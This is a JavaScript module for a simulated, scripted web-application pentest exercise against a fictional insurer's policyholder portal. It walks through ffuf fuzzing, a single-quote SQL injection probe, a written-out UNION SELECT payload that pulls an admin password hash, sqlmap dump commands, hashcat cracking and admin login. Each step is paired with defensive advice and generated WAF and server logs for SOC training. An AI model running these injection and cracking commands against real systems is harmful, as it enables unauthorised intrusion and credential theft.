// Simulated engagement #3: a WEB-APPLICATION assessment of Halcyon Mutual's policyholder portal.
// This is the OWASP A03:2021 (Injection) story — the single most-taught web vulnerability — played end to
// end: map the app, find a claims-lookup parameter that is built into a SQL string, confirm the injection
// with one quote, use a UNION query to pull the admin's password hash out of the users table, crack it
// offline, then log into the admin console with it and read the planted proof note.
//
// Everything is fiction and canned, exactly like the other engagements. The portal and database use RFC 5737
// documentation addresses and *.example names (RFC 2606); commands are a fixed whitelist; every byte of
// output is pre-written; nothing is executed and there is no real payload. sqlmap/ffuf/hashcat are named
// because they are the standard tools on the MITRE ATT&CK / OWASP pages for these techniques — here they only
// print scripted text. Each step: id, tactic + tid/tname (ATT&CK), goal, defend, choices, and logs(b, t, ctx)
// that writes the blue-team trace (nginx access logs, ModSecurity/CRS WAF alerts, the app error log) into the
// SIEM keyed to the step, so the SOC debrief can grade which line each move left.
import { PORTAL, CLAIMSDB } from './halcyon-engagement.js';

export const WEB_ATTACKER = { ip: '198.51.100.77', host: 'assessor' };
export const WEB_FLAG = 'FLAG{one-quote-owned-the-portal}';
// A separate assessment window, the Thursday before the external-network phase.
export const WEB_DATE = { weekday: 'THU', name: 'Thursday', month: 'Oct', day: 29, year: 2026, domain: 'halcyon.example', netbios: 'HALCYON' };
// The claims admin whose bcrypt hash the users table holds, and the wordlist password it cracks to.
const ADMIN = { user: 'claims_admin', hash: '$2b$10$Kf9qR1uUuE8oP3xq2m9jce', password: 'Autumn2024!' };

const pad = (n) => String(n).padStart(2, '0');
const clock = (t) => `${pad(Math.floor(t / 3600))}:${pad(Math.floor((t % 3600) / 60))}:${pad(t % 60)}`;
const webStamp = (t) => `[${WEB_DATE.day}/${WEB_DATE.month}/${WEB_DATE.year}:${clock(t)} -0400]`;

const UA_ATK = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0';
const UA_FFUF = 'ffuf/2.1.0 (authorised assessment)';
const UA_SQLMAP = 'sqlmap/1.8.3';

/** nginx access_combined line on the portal. */
function nginx(b, t, ip, method, path, status, bytes, ua, extra = {}) {
  const raw = `${ip} - - ${webStamp(t)} "${method} ${path} HTTP/1.1" ${status} ${bytes} "-" "${ua}"`;
  return b.add(t, PORTAL.host, 'nginx', `nginx: ${raw}`, { ip, access: raw, ...extra });
}
/** ModSecurity / OWASP CRS alert line on the WAF in front of the portal. */
function waf(b, t, ip, ruleId, msg, path, extra = {}) {
  return b.add(t, 'waf01', 'waf', `ModSecurity: Warning. ${msg} [id "${ruleId}"] [client ${ip}] [uri "${path}"] [host "${PORTAL.name}"]`, { ip, alert: msg, ...extra });
}
/** The portal application's own error log (Gunicorn/Flask-style), where unhandled SQL errors land. */
function applog(b, t, level, msg, extra = {}) {
  return b.add(t, PORTAL.host, 'portal-app', `portal-app ${level} ${msg}`, extra);
}

export const WEB_ENGAGEMENT = {
  id: 'halcyon-web-2026',
  name: 'Web app (SQL injection)',
  client: 'Halcyon Mutual',
  title: 'Web app pentest: Halcyon policyholder portal',
  blurb: 'Test the policyholder portal the way OWASP teaches: find the claim-lookup field, prove it is wired straight into a SQL query with a single quote, read the admin password hash out of the database with one UNION, crack it, and log in to the admin console to reach the proof. 5 moves, recon → account takeover.',
  seed: 5273,
  date: WEB_DATE,
  attacker: WEB_ATTACKER,
  prompt: `${WEB_ATTACKER.host}@kali:~/halcyon-web$`,
  flag: WEB_FLAG,
  noise: webEngagementNoise,
  summary: 'The one-line report: the claim-status lookup built the user’s reference straight into a SQL string, so one quote turned it into SQL injection (OWASP A03). A single UNION query read the admin’s bcrypt hash out of the users table; the password was on a wordlist and the admin console had no second factor. Three fixes (parameterised queries / prepared statements, a strong admin password behind MFA, and least-privilege for the app’s database account so it cannot read other tables) break the whole chain — and the WAF already logged the UNION, so the SOC could have caught it.',
  start: 10 * 3600 + 12 * 60, // 10:12, inside the agreed window
  roe: [
    'Authorised by Halcyon Mutual’s CISO as the web-application phase, Thursday Oct 29, 09:00–12:00. Simulated hosts only.',
    `In scope: the policyholder portal ${PORTAL.name} (${PORTAL.ip}) and the application database behind it.`,
    'Objective: prove account takeover of the claims admin by reading the proof note the CISO planted in the admin console. Nothing else.',
    'Out of scope: reading, dumping or copying real policyholder data (the policyholders table), denial of service, defacement, altering any record.',
    'Stealth counts: a WAF and the SOC watch the portal. Loud moves (automated scanners, full table dumps) show up as alerts in the debrief.',
  ],
  steps: [
    {
      id: 'map',
      tactic: 'Reconnaissance',
      tid: 'T1595.003',
      tname: 'Active Scanning: Wordlist Scanning',
      goal: 'Map the portal and find a page that takes user input you can tamper with.',
      defend: 'WAF rate limiting on bursts of requests; keep the attack surface small and behind authentication where possible.',
      choices: [
        {
          cmd: `ffuf -u https://${PORTAL.name}/FUZZ -w api-endpoints.txt -mc 200,302,403`,
          label: 'Targeted wordlist of likely app paths (quiet)',
          output: [
            `        /'___\\  /'___\\           /'___\\       ffuf 2.1.0`,
            `:: Target : https://${PORTAL.name}/FUZZ  :: wordlist api-endpoints.txt (260 words)`,
            'login                   [Status: 200, Size: 6230]',
            'admin                   [Status: 403, Size: 162]',
            'api/claims/lookup       [Status: 200, Size: 742]',
            'api/health              [Status: 200, Size: 17]',
            ':: 260 requests :: 256 × 404',
            '# /api/claims/lookup answered. It takes a ?ref= claim number — user input reaching the backend.',
          ],
        },
        {
          cmd: `ffuf -u https://${PORTAL.name}/FUZZ -w raft-large-words.txt -t 200`,
          label: 'Full 62k-word fuzz, 200 threads (loud)',
          loud: true,
          output: [
            `:: Target : https://${PORTAL.name}/FUZZ  :: wordlist raft-large-words.txt (62,284 words)`,
            'login                   [Status: 200, Size: 6230]',
            'admin                   [Status: 403, Size: 162]',
            'api/claims/lookup       [Status: 200, Size: 742]',
            'api/health              [Status: 200, Size: 17]',
            ':: Progress: 62284/62284 :: 62,280 × 404 in 41s',
            '# Same four hits, 62,000 extra requests in under a minute. The WAF rate rule fired.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        nginx(b, t, WEB_ATTACKER.ip, 'GET', '/api/claims/lookup', 200, 742, loud ? UA_FFUF : UA_ATK, { key: 'map', attack: 'T1595.003' });
        nginx(b, t + 1, WEB_ATTACKER.ip, 'GET', '/admin', 403, 162, loud ? UA_FFUF : UA_ATK, { key: 'map', attack: 'T1595.003' });
        if (loud) {
          ['/.git/config', '/backup.zip', '/wp-login.php', '/phpmyadmin/', '/.env'].forEach((p, i) =>
            nginx(b, t + 3 + i, WEB_ATTACKER.ip, 'GET', p, 404, 153, UA_FFUF, { key: 'map', attack: 'T1595.003' }));
          b.add(t + 20, 'waf01', 'waf', `waf: rule=HALCYON-RATE action=throttle client=${WEB_ATTACKER.ip} host=${PORTAL.name} requests=62284 window=60s`, { ip: WEB_ATTACKER.ip, key: 'map', attack: 'T1595.003', detection: 'WAF: 62,000+ requests from one address in a minute (automated scanner)' });
        }
      },
    },
    {
      id: 'confirm',
      tactic: 'Initial Access',
      tid: 'T1190',
      tname: 'Exploit Public-Facing Application',
      goal: 'Prove the ref parameter is SQL injectable: send a single quote and watch the query break.',
      defend: 'Use parameterised queries / prepared statements so input can never change the SQL; never return raw database errors to the client.',
      choices: [
        {
          cmd: `curl -s "https://${PORTAL.name}/api/claims/lookup?ref=100417'"`,
          label: 'Send one quote by hand and read the error (quiet)',
          output: [
            '{"error":"server error","trace_id":"c7f1a2"}',
            '# The page 500s on a single quote. The app error log (below) spells out why:',
            'sqlite3.OperationalError: near "\'": syntax error',
            'SQL: SELECT ref, status, filed, adjuster, amount, note',
            '       FROM claims WHERE ref = \'100417\'\'   <-- our quote ended the string early',
            '# Classic SQL injection: our input is pasted straight into the query (OWASP A03).',
          ],
        },
        {
          cmd: `sqlmap -u "https://${PORTAL.name}/api/claims/lookup?ref=1" --batch --level=5 --risk=3`,
          label: 'Let sqlmap hammer every payload at it (loud)',
          loud: true,
          output: [
            'sqlmap/1.8.3',
            `[*] testing connection to the target URL`,
            'got 403 (Forbidden) on payloads containing UNION/SLEEP — WAF is filtering',
            "[*] parameter 'ref' appears to be 'generic UNION query' injectable",
            '[*] the back-end DBMS is SQLite',
            '# sqlmap confirms it too — after ~480 requests, half of them blocked and logged by the WAF.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        nginx(b, t, WEB_ATTACKER.ip, 'GET', "/api/claims/lookup?ref=100417'", 500, 41, loud ? UA_SQLMAP : UA_ATK, { key: 'confirm', attack: 'T1190' });
        applog(b, t, 'ERROR', 'sqlite3.OperationalError: near "\'": syntax error [GET /api/claims/lookup ref=100417\']', { key: 'confirm', attack: 'T1190', detection: 'App error log: unhandled SQL syntax error on /api/claims/lookup — the parameter reaches raw SQL' });
        if (loud) {
          for (let i = 0; i < 4; i++)
            waf(b, t + 2 + i, WEB_ATTACKER.ip, 942100 + i, 'SQL Injection Attack Detected via libinjection', `/api/claims/lookup?ref=1${['%27', '%20UNION', '%20OR%201%3D1', '%20AND%20SLEEP'][i]}`, { key: 'confirm', attack: 'T1190', detection: i === 0 ? 'WAF (CRS 942100): SQL injection payloads blocked on the ref parameter — hundreds in seconds (sqlmap)' : undefined });
        }
      },
    },
    {
      id: 'dump',
      tactic: 'Credential Access',
      tid: 'T1212',
      tname: 'Exploitation for Credential Access',
      goal: 'Use the injection to read the admin password hash out of the users table — the credential you need, nothing more.',
      defend: 'Give the app’s database account least privilege (only the claims table it needs) so a single injection cannot read the users table; store passwords with a slow hash (bcrypt) and a high work factor.',
      choices: [
        {
          cmd: `curl -s "https://${PORTAL.name}/api/claims/lookup?ref=0 UNION SELECT username,pwd_hash,role,NULL,NULL,NULL FROM users WHERE role='admin'-- -"`,
          label: 'One UNION query for just the admin credential row (quiet)',
          output: [
            '{"results":[{',
            `    "ref":"${ADMIN.user}",`,
            `    "status":"${ADMIN.hash}...",`,
            '    "filed":"admin"',
            '}]}',
            '# The claim fields now carry the users-table row: claims_admin, a bcrypt hash, role=admin.',
            '# The app’s DB account can read the users table — it only needed the claims table.',
          ],
        },
        {
          cmd: `sqlmap -u "https://${PORTAL.name}/api/claims/lookup?ref=1" -D claims -T users --dump --batch`,
          label: 'Dump the whole users table with sqlmap (loud)',
          loud: true,
          output: [
            '[*] dumping entries for table \'users\' in database \'claims\'',
            'username      | pwd_hash              | role',
            `${ADMIN.user} | ${ADMIN.hash}... | admin`,
            'j.alvarez     | $2b$10$9aQ...         | adjuster',
            'priya.r       | $2b$10$1mX...         | adjuster',
            '[*] 14 entries dumped. Every staff hash, not just the one you needed.',
            '# Thorough and noisy: every UNION went through the WAF, which logged each one.',
          ],
        },
        {
          cmd: `sqlmap -u "https://${PORTAL.name}/api/claims/lookup?ref=1" -D claims -T policyholders --dump --batch`,
          label: 'Dump the policyholders table (customer PII)',
          violation: true,
          output: [
            'STOPPED by the rules of engagement.',
            'The policyholders table holds real customer PII (names, SSNs, claim amounts). Dumping it is out of',
            'scope: you prove account takeover by reading the planted admin note, you do not steal the data.',
            'Strike recorded.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        const unionPath = "/api/claims/lookup?ref=0 UNION SELECT username,pwd_hash,role,NULL,NULL,NULL FROM users...";
        nginx(b, t, WEB_ATTACKER.ip, 'GET', unionPath, 200, 318, loud ? UA_SQLMAP : UA_ATK, { key: 'dump', attack: 'T1212' });
        waf(b, t, WEB_ATTACKER.ip, 942190, 'Detects classic SQL injection probings: UNION SELECT in ref', '/api/claims/lookup', { key: 'dump', attack: 'T1212', detection: 'WAF (CRS 942190): a UNION SELECT reached /api/claims/lookup — successful SQL injection, even though it returned 200' });
        if (loud) {
          for (let i = 0; i < 3; i++)
            waf(b, t + 2 + i, WEB_ATTACKER.ip, 942190, 'Detects classic SQL injection probings: UNION SELECT', '/api/claims/lookup', { key: 'dump', attack: 'T1212' });
        }
      },
    },
    {
      id: 'crack',
      tactic: 'Credential Access',
      tid: 'T1110.002',
      tname: 'Brute Force: Password Cracking',
      goal: 'Turn the hash into a password — on your own laptop, off the network.',
      defend: 'bcrypt slows this down, but a wordlist password still falls. Require a long passphrase and MFA on the admin console; the crack itself leaves no server-side trace, so the login is your first visible move.',
      choices: [
        {
          cmd: 'hashcat -m 3200 claims_admin.hash rockyou.txt',
          label: 'Crack the bcrypt hash offline with a wordlist',
          output: [
            'hashcat (v6.2.6) starting',
            'Hash.Mode........: 3200 (bcrypt $2*$, Blowfish)',
            'Speed.#1.........: 171 H/s (bcrypt is deliberately slow)',
            'Recovered........: 1/1 (100.00%) Digests',
            '',
            `${ADMIN.hash}...:${ADMIN.password}`,
            `# Cracked: ${ADMIN.user} / ${ADMIN.password}. bcrypt bought time, but the password was on rockyou.`,
            '# Nothing above touched Halcyon. The SOC saw none of it.',
          ],
        },
      ],
      logs(b, t) {
        // Offline cracking leaves no server-side log. The one trace is the assessor confirming the password
        // works on the normal login form, which looks like any other successful login (no alert).
        nginx(b, t, WEB_ATTACKER.ip, 'POST', '/login', 302, 0, UA_ATK, { key: 'crack', attack: 'T1110.002' });
        b.add(t + 1, PORTAL.host, 'portal-app', `portal-app INFO login ok user=${ADMIN.user} ip=${WEB_ATTACKER.ip} path=/login`, { ip: WEB_ATTACKER.ip, user: ADMIN.user, key: 'crack', attack: 'T1110.002' });
      },
    },
    {
      id: 'proof',
      tactic: 'Initial Access',
      tid: 'T1078',
      tname: 'Valid Accounts',
      goal: 'Log into the admin console with the cracked password and read the planted proof note. Nothing else.',
      defend: 'MFA on the admin console would have stopped this even with the password; alert on admin logins from new locations and on the first admin login for a dormant account.',
      objective: true,
      choices: [
        {
          cmd: `curl -s -u ${ADMIN.user}:'${ADMIN.password}' https://${PORTAL.name}/admin/notes`,
          label: 'Sign in to the admin console and read the notes',
          prompt: `${WEB_ATTACKER.host}@kali:~/halcyon-web# (admin)`,
          output: [
            'HTTP/1.1 200 OK  (admin session established)',
            '{"notes":[{',
            '  "title":"ENGAGEMENT PROOF — do not remove until report accepted",',
            '  "author":"CISO office",',
            `  "body":"If you can read this, you took over the claims admin account via the portal. ${WEB_FLAG}"`,
            '}]}',
            '# Account takeover proven. Objective reached — stop here and write it up.',
          ],
        },
      ],
      logs(b, t) {
        nginx(b, t, WEB_ATTACKER.ip, 'GET', '/admin/notes', 200, 512, UA_ATK, { key: 'proof', attack: 'T1078', detection: `Rule: admin console login for ${ADMIN.user} from a new address (${WEB_ATTACKER.ip}) — no MFA` });
        b.add(t + 1, PORTAL.host, 'portal-app', `portal-app INFO admin login user=${ADMIN.user} ip=${WEB_ATTACKER.ip} mfa=none session=opened`, { ip: WEB_ATTACKER.ip, user: ADMIN.user, key: 'proof', attack: 'T1078' });
      },
    },
  ],
};

/** Ordinary portal traffic for the morning, so the attack has a haystack of normal claim lookups to hide in. */
export function webEngagementNoise(b, start, end) {
  const { r } = b;
  const pages = [['/', 200, 6120], ['/login', 200, 6230], ['/static/app.js', 200, 92114], ['/api/health', 200, 17], ['/favicon.ico', 200, 4286]];
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
  ];
  for (let t = start - 600; t < end; t += 20 + Math.floor(r() * 60)) {
    const ip = r() < 0.5 ? `198.51.100.${10 + Math.floor(r() * 50)}` : `203.0.113.${100 + Math.floor(r() * 120)}`;
    if (r() < 0.4) {
      // real policyholders looking up their own claims: the legitimate use of the parameter we abuse
      nginx(b, t, ip, 'GET', `/api/claims/lookup?ref=${100000 + Math.floor(r() * 90000)}`, 200, 742, b.pick(uas), { noise: true });
    } else {
      const [p, s, bytes] = b.pick(pages);
      nginx(b, t, ip, 'GET', p, s, bytes, b.pick(uas), { noise: true });
    }
  }
  // Background internet scanners probing common CMS paths (documentation range), all 404.
  const junk = ['/wp-login.php', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', '/.env', '/config.json', '/cgi-bin/'];
  for (let t = start - 400; t < end; t += 120 + Math.floor(r() * 300))
    nginx(b, t, r() < 0.5 ? '203.0.113.207' : '198.51.100.9', 'GET', junk[Math.floor(r() * junk.length)], 404, 153, 'Mozilla/5.0 zgrab/0.x', { noise: true });
}
